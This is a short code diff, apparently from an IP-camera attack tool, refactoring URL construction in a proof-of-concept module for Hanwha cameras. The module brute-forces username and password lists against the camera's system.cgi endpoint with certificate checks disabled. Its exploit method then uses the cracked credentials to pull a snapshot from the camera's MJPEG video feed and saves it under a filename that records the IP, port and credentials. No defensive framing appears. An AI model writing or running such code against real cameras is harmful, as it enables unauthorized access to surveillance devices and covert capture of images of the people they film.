@@ -16,8 +16,7 @@ class HanwhaWeakPassword(POCTemplate):
         headers = {"User-Agent": self.config.user_agent}
         for user in self.config.users:
             for password in self.config.passwords:
-                url = (f"http://{ip}:{port}/stw-cgi/system.cgi"
-                       f"?msubmenu=deviceinfo&action=view")
+                url = self.url(ip, port, "/stw-cgi/system.cgi?msubmenu=deviceinfo&action=view")
                 try:
                     r = self.session.get(url, headers=headers, auth=(user, password),
                                          timeout=self.config.timeout, verify=False)
@@ -31,7 +30,7 @@ class HanwhaWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         return self._snapshot(
-            f"http://{ip}:{port}/stw-cgi/video.cgi?msubmenu=mjpeg&action=view",
+            self.url(ip, port, "/stw-cgi/video.cgi?msubmenu=mjpeg&action=view"),
             f"{ip}-{port}-{user}-{password}-hanwha.jpg",
             auth=(user, password))
 
